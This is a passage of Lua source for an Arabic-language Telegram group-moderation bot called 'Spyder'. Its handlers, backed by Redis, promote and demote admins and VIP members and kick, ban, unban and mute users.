send(msg.chat_id_, msg.id_,'⌔︙ تم تعطيل الرفع من قبل المنشئين') 
return false
end
redis:sadd('Spyder:'..bot_id..'Set:Admin'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم ترقيته ادمن'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⌔︙العضو ↫ '..userid..''
status  = '\n⌔︙ تم ترقيته ادمن'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("تنزيل ادمن") and msg.reply_to_message_id_ and Owners(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
redis:srem('Spyder:'..bot_id..'Set:Admin'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم تنزيله من الادمنيه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل ادمن @(.*)$") and Owners(msg) then
local username = text:match("^تنزيل ادمن @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
redis:srem('Spyder:'..bot_id..'Set:Admin'..msg.chat_id_, result.id_)
usertext = '\n⌔︙العضو ↫ ['..result.title_..'](t.me/'..(username or 'Spyder')..')'
status  = '\n⌔︙ تم تنزيله من الادمنيه'
texts = usertext..status
else
texts = '⌔︙ لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^تنزيل ادمن (%d+)$") and Owners(msg) then
local userid = text:match("^تنزيل ادمن (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
redis:srem('Spyder:'..bot_id..'Set:Admin'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم تنزيله من الادمنيه'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⌔︙العضو ↫ '..userid..''
status  = '\n⌔︙ تم تنزيله من الادمنيه'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------
if text == ("طرد") and msg.reply_to_message_id_ ~=0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
if redis:get('Spyder:'..bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'⌔︙ تم تعطيل الطرد من قبل المنشئين') 
return false
end
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "⚠︙هذا بوت لا يمكنني الطرد ")
return false 
end
if GetZanCan(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n⚠︙ عذرا لا يمكنك طرد ( '..Get_Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,'⚠︙ ليس لدي صلاحية حظر العضوين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'⌔︙ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⌔︙ العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
statusk  = '\n⌔︙ تم طرده من هنا'
send(msg.chat_id_, msg.id_, usertext..statusk)
end,nil)
Group_Kick(result.chat_id_, result.sender_user_id_)
end,nil)   
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end  
if text and text:match("^طرد @(.*)$") and Mod(msg) then 
local username = text:match("^طرد @(.*)$")
if redis:get('Spyder:'..bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'⌔︙ تم تعطيل الطرد من قبل المنشئين') 
return false
end
function start_function(extra, result, success)
if result.id_ then
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "⚠︙هذا بوت لا يمكنني الطرد ")
return false 
end
if GetZanCan(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n⚠︙ عذرا لا يمكنك طرد ( '..Get_Rutba(result.id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⚠︙ عذرا عزيزي العضو هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,'⚠︙ ليس لدي صلاحية حظر العضوين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'⌔︙ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
usertext = '\n⌔︙ العضو ↫ ['..result.title_..'](t.me/'..(username or 'Spyder')..')'
statusk  = '\n⌔︙ تم طرده من هنا'
texts = usertext..statusk
Group_Kick(msg.chat_id_, result.id_)
send(msg.chat_id_, msg.id_, texts)
end,nil)   
end
else
send(msg.chat_id_, msg.id_, '⚠︙ لا يوجد حساب بهاذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  

if text and text:match("^طرد (%d+)$") and Mod(msg) then 
local userid = text:match("^طرد (%d+)$") 
if redis:get('Spyder:'..bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'⌔︙ تم تعطيل الطرد من قبل المنشئين') 
return false
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "⚠︙هذا بوت لا يمكنني الطرد")
return false 
end
if GetZanCan(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n⚠︙ عذرا لا يمكنك طرد ( '..Get_Rutba(userid,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = userid, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,'⚠︙ ليس لدي صلاحية حظر العضوين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'⌔︙ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
Group_Kick(msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
 usertext = '\n⌔︙ العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
 statusk  = '\n⌔︙ تم طرده من هنا'
send(msg.chat_id_, msg.id_, usertext..statusk)
else
 usertext = '\n⌔︙ العضو ↫ '..userid..''
 statusk  = '\n⌔︙ تم طرده من هنا'
send(msg.chat_id_, msg.id_, usertext..statusk)
end;end,nil)
end,nil)   
end
return false
end
------------------------------------------------------------------------
------------------------------------------------------------------------
if text == 'مسح المميزين' and Mod(msg) then
redis:del('Spyder:'..bot_id..'Set:Vip'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '⌔︙  تم مسح  قائمة الاعضاء المميزين  ')
end
if text == ("المميزين") and Mod(msg) then
local list = redis:smembers('Spyder:'..bot_id..'Set:Vip'..msg.chat_id_)
t = "\n⌔︙ قائمة مميزين المجموعه \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
local username = redis:get('Spyder:'..bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "⌔︙ لا يوجد مميزين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("رفع مميز") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
if redis:get('Spyder:'..bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'⌔︙ تم تعطيل الرفع من قبل المنشئين') 
return false
end
function start_function(extra, result, success)
redis:sadd('Spyder:'..bot_id..'Set:Vip'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
local  statuss  = '\n⌔︙ تم ترقيته مميز هنا '
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع مميز @(.*)$") and Mod(msg) then
local username = text:match("^رفع مميز @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
if redis:get('Spyder:'..bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'⌔︙ تم تعطيل الرفع من قبل المنشئين') 
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatconfig") then
send(msg.chat_id_,msg.id_,"⌔︙ عذرا عزيزي العضو هذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
redis:sadd('Spyder:'..bot_id..'Set:Vip'..msg.chat_id_, result.id_)
usertext = '\n⌔︙العضو ↫ ['..result.title_..'](t.me/'..(username or 'Spyder')..')'
local  statuss  = '\n⌔︙ تم ترقيته مميز هنا'
texts = usertext..statuss
else
texts = '⌔︙ لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text and text:match("^رفع مميز (%d+)$") and Mod(msg) then
local userid = text:match("^رفع مميز (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
if redis:get('Spyder:'..bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'⌔︙ تم تعطيل الرفع من قبل المنشئين') 
return false
end
redis:sadd('Spyder:'..bot_id..'Set:Vip'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
local  statuss  = '\n⌔︙ تم ترقيته مميز هنا'
send(msg.chat_id_, msg.id_, usertext..statuss)
else
usertext = '\n⌔︙العضو ↫ '..userid..''
local  statuss  = '\n⌔︙ تم ترقيته مميز هنا '
send(msg.chat_id_, msg.id_, usertext..statuss)
end;end,nil)
return false
end

if (text == ("تنزيل مميز")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
redis:srem('Spyder:'..bot_id..'Set:Vip'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل مميز @(.*)$") and Mod(msg) then
local username = text:match("^تنزيل مميز @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
redis:srem('Spyder:'..bot_id..'Set:Vip'..msg.chat_id_, result.id_)
usertext = '\n⌔︙العضو ↫ ['..result.title_..'](t.me/'..(username or 'Spyder')..')'
status  = '\n⌔︙ تم تنزيله من المميزين'
texts = usertext..status
else
texts = '⌔︙ لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^تنزيل مميز (%d+)$") and Mod(msg) then
local userid = text:match("^تنزيل مميز (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
redis:srem('Spyder:'..bot_id..'Set:Vip'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⌔︙العضو ↫ '..userid..''
status  = '\n⌔︙ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end  
------------------------------------------------------------------------
if text == 'مسح المحظورين' and Mod(msg) then
redis:del('Spyder:'..bot_id..'Ban:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n⌔︙ تم مسح المحظورين')
end
if text == ("المحظورين") then
local list = redis:smembers('Spyder:'..bot_id..'Ban:User'..msg.chat_id_)
t = "\n⌔︙ قائمة محظورين المجموعه \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
local username = redis:get('Spyder:'..bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "⌔︙ لا يوجد محظورين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("حظر") and msg.reply_to_message_id_ ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
if redis:get('Spyder:'..bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'⌔︙ تم تعطيل الحظر من قبل المنشئين') 
return false
end
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "⚠︙هذا بوت لا يمكنني الحظر ")
return false 
end
if GetZanCan(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n⚠︙ عذرا لا يمكنك حظر ( '..Get_Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,'⚠︙ ليس لدي صلاحية حظر العضوين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'⌔︙ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
redis:sadd('Spyder:'..bot_id..'Ban:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⌔︙ العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم حظره من المجموعه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
Group_Kick(result.chat_id_, result.sender_user_id_)
end,nil)   
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if text and text:match("^حظر @(.*)$") and Mod(msg) then
local username = text:match("^حظر @(.*)$")
if redis:get('Spyder:'..bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'⌔︙ تم تعطيل الحظر من قبل المنشئين') 
return false
end
function start_function(extra, result, success)
if result.id_ then
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "⚠︙هذا بوت لا يمكنني الحظر ")
return false 
end
if GetZanCan(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n⚠︙ عذرا لا يمكنك حظر ( '..Get_Rutba(result.id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⚠︙ عذرا عزيزي العضو هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,'⚠︙ ليس لدي صلاحية حظر العضوين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'⌔︙ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
redis:sadd('Spyder:'..bot_id..'Ban:User'..msg.chat_id_, result.id_)
usertext = '\n⌔︙ العضو ↫ ['..result.title_..'](t.me/'..(username or 'Spyder')..')'
status  = '\n⌔︙ تم حظره من المجموعه'
texts = usertext..status
Group_Kick(msg.chat_id_, result.id_)
send(msg.chat_id_, msg.id_, texts)
end,nil)   
end
else
send(msg.chat_id_, msg.id_, '⚠︙ لا يوجد حساب بهاذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text and text:match("^حظر (%d+)$") and Mod(msg) then
local userid = text:match("^حظر (%d+)$") 
if redis:get('Spyder:'..bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'⌔︙ تم تعطيل الحظر من قبل المنشئين') 
return false
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "⚠︙هذا بوت لا يمكنني الحظر")
return false 
end
if GetZanCan(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n⚠︙ عذرا لا يمكنك حظر ( '..Get_Rutba(userid,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = userid, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,'⚠︙ ليس لدي صلاحية حظر العضوين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'⌔︙ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
redis:sadd('Spyder:'..bot_id..'Ban:User'..msg.chat_id_, userid)
Group_Kick(msg.chat_id_, userid)  
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⌔︙ العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم حظره من المجموعه'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⌔︙ العضو ↫ '..userid..''
status  = '\n⌔︙ تم حظره من المجموعه'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
end,nil)   
end
return false
end
if text == ("الغاء حظر") and msg.reply_to_message_id_ and Mod(msg) then
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, '⌔︙ انا لست محظورا \n') 
return false 
end
redis:srem('Spyder:'..bot_id..'Ban:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⌔︙ العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم الغاء حظره من هنا'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
 
if text and text:match("^الغاء حظر @(.*)$") and Mod(msg) then
local username = text:match("^الغاء حظر @(.*)$") 
function start_function(extra, result, success)
if result.id_ then
if tonumber(result.id_) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, '⌔︙ انا لست محظورا \n') 
return false 
end
redis:srem('Spyder:'..bot_id..'Ban:User'..msg.chat_id_, result.id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
usertext = '\n⌔︙ العضو ↫ ['..result.title_..'](t.me/'..(username or 'Spyder')..')'
status  = '\n⌔︙ تم الغاء حظره من هنا'
texts = usertext..status
else
texts = '⚠︙ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text and text:match("^الغاء حظر (%d+)$") and Mod(msg) then
local userid = text:match("^الغاء حظر (%d+)$") 
if tonumber(userid) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, '⌔︙ انا لست محظورا \n') 
return false 
end
redis:srem('Spyder:'..bot_id..'Ban:User'..msg.chat_id_, userid)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = userid, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⌔︙ العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم الغاء حظره من هنا'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⌔︙ العضو ↫ '..userid..''
status  = '\n⌔︙ تم الغاء حظره من هنا'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------
if text == 'مسح المكتومين' and Mod(msg) then
redis:del('Spyder:'..bot_id..'Muted:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '⌔︙  تم مسح قائمه المكتومين ')
end
if text == ("المكتومين") and Mod(msg) then
local list = redis:smembers('Spyder:'..bot_id..'Muted:User'..msg.chat_id_)
t = "\n⌔︙ قائمة المكتومين \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
local username = redis:get('Spyder:'..bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "⌔︙ لا يوجد مكتومين"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("كتم") and msg.reply_to_message_id_ ~= 0 and Mod(msg) then
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "⚠︙هذا بوت لا يمكنني الكتم ")
return false 
end
if GetZanCan(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n⚠︙ عذرا لا يمكنك كتم ( '..Get_Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'⌔︙ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
redis:sadd('Spyder:'..bot_id..'Muted:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⌔︙ العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم كتمه من هنا'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^كتم @(.*)$") and Mod(msg) then
local username = text:match("^كتم @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'⌔︙ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "⚠︙هذا بوت لا يمكنني الكتم ")
return false 
end
if GetZanCan(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n⚠︙ عذرا لا يمكنك كتم ( '..Get_Rutba(result.id_,msg.chat_id_)..' )')
else
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⚠︙ عذرا عزيزي العضو هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
redis:sadd('Spyder:'..bot_id..'Muted:User'..msg.chat_id_, result.id_)
usertext = '\n⌔︙ العضو ↫ ['..result.title_..'](t.me/'..(username or 'Spyder')..')'
status  = '\n⌔︙ تم كتمه من هنا'
texts = usertext..status
